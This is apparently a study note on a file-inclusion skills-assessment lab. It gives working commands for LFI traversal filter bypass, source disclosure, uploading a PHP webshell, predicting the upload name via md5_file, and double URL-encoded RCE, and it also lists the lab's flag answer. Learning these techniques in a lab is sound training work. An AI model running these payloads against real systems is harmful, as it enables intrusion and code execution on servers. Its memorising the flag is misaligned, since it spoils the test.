## ID
531

## Module
File Inclusion

## Kind
lab

## Title
Skills Assessment — File Inclusion

## Description
Full attack chain combining LFI path traversal bypass, source code disclosure via LFI, unrestricted file upload, md5_file filename prediction, and double URL-encoding to achieve RCE and retrieve the root flag.

## Tags
lfi, file-upload, path-traversal, double-url-encoding, rce

## Commands
- echo '<?php system($_GET["cmd"]); ?>' > shell.php
- md5sum shell.php
- curl 'http://<IP>:<PORT>/api/image.php?p=....//....//....//....//etc/passwd'
- curl 'http://<IP>:<PORT>/api/image.php?p=....//....//....//....//var/www/html/contact.php'
- curl 'http://<IP>:<PORT>/api/image.php?p=....//....//....//....//var/www/html/api/apply.php'
- curl 'http://<IP>:<PORT>/contact.php?region=%252E%252E%252Fuploads%252F<HASH>&cmd=id'
- curl 'http://<IP>:<PORT>/contact.php?region=%252E%252E%252Fuploads%252F<HASH>&cmd=cat+/*.txt'

## What This Section Covers
This skills assessment chains multiple web vulnerabilities into a full RCE path. It covers LFI filter bypass via non-recursive `str_replace` evasion, using LFI for source code disclosure to map the application's logic, exploiting an unrestricted file upload to plant a PHP webshell, predicting the server-side filename using `md5_file()`, and bypassing a dot/slash character blacklist using double URL-encoding before triggering code execution.

## Methodology
1. Open Burp Suite and browse to the target. In HTTP History, enable Images (Proxy → HTTP History → Filter → MIME type → Images)
2. Intercept an `/api/image.php?p=<hash>` request, send to Repeater; replace `p` with `....//....//....//....//etc/passwd` to confirm LFI
3. Use LFI to read `contact.php` source — discover the `region` parameter passed to `include(urldecode(...))` with a blacklist blocking `.` and `/`
4. Use LFI to read `/api/apply.php` — learn that uploads go to `/uploads/` named with `md5_file()` (hash of file contents, no extension)
5. Create the webshell locally and compute its MD5: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && md5sum shell.php`
6. Upload `shell.php` via the `apply.php` form — no file extension validation, so `.php` uploads succeed
7. Double URL-encode the traversal path: `.` → `%2E` → `%252E` and `/` → `%2F` → `%252F`
8. Trigger RCE via `GET /contact.php?region=%252E%252E%252Fuploads%252F<HASH>&cmd=cat+/*.txt`

## Multi-step Workflow
```
# 1. Confirm LFI (in Burp Repeater)
GET /api/image.php?p=....//....//....//....//etc/passwd

# 2. Read source files via LFI
GET /api/image.php?p=....//....//....//....//var/www/html/contact.php
GET /api/image.php?p=....//....//....//....//var/www/html/api/apply.php

# 3. Create webshell and get its MD5 (used as server-side filename)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
md5sum shell.php
# example output: fc023fcacb27a7ad72d605c4e300b389  shell.php

# 4. Upload via apply.php (use Burp or curl multipart)

# 5. Verify upload directly: hit /uploads/<HASH> in the browser
#    Empty 200 response = file exists (PHP executed with no cmd param)
#    404 = upload failed or hash mismatch

# 6. Trigger RCE — double-encode: ../uploads/HASH
# . → %2E → %252E   / → %2F → %252F
GET /contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=id

# 7. Retrieve flag — output appears inside the <p> tag of the rendered contact page
GET /contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/*.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Find flag in / root directory | `eedbb78d4800aa45573840ed6bd2d1e3` | RCE via double-encoded region param + webshell at `/uploads/<md5>` included via PHP `include()`; payload `cmd=cat+/*.txt` |

## Key Takeaways
- `str_replace('../', '', $input)` is bypassable with `....//` — stripping `../` from `....//` leaves `../`
- `include(urldecode($region))` with a single decode pass means double URL-encoding survives the blacklist check intact, then decodes during inclusion
- `md5_file()` is deterministic and based on file *contents* — compute the MD5 of your local shell before uploading to predict the server-side path exactly
- Files stored without extension are still executed as PHP when loaded via `include()` — extension is irrelevant to PHP's parser in this context
- The attack chain is: LFI → source disclosure → upload endpoint discovery → webshell plant → bypass → RCE. Each step enables the next
- When debugging RCE, output from your webshell renders inside the *contact page's HTML* — look inside the `<p>` tag in the body, not at the page itself

## Gotchas
- Burp does not show image requests by default — you must enable Images under MIME type in the HTTP History filter or you will miss the `/api/image.php` endpoint entirely
- Single URL-encoding (`%2E`, `%2F`) still triggers the blacklist; only double-encoding (`%252E`, `%252F`) bypasses it
- `md5_file()` hashes the *contents*, not the filename — `md5sum shell.php` on a locally created file matches only if the content is byte-for-byte identical including any trailing newline from `echo`
- The uploaded file has no `.php` extension on the server, but PHP executes it anyway via `include()` — do not append `.php` to the region path or the inclusion will fail
- An empty `<p></p>` in the response does NOT mean the exploit failed — it means the include succeeded but `$_GET["cmd"]` was not provided. Always include `&cmd=id` (or similar) to actually trigger the shell. Forgetting `cmd` wastes 30 minutes of debugging encoding that is already correct
- To verify the webshell is on disk, hit `/uploads/<HASH>` directly — a blank 200 response means the file is present and being executed by PHP (with no command output). A 404 means the upload didn't land or the hash is wrong


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[10-prevention]]
<!-- AUTO-LINKS-END -->
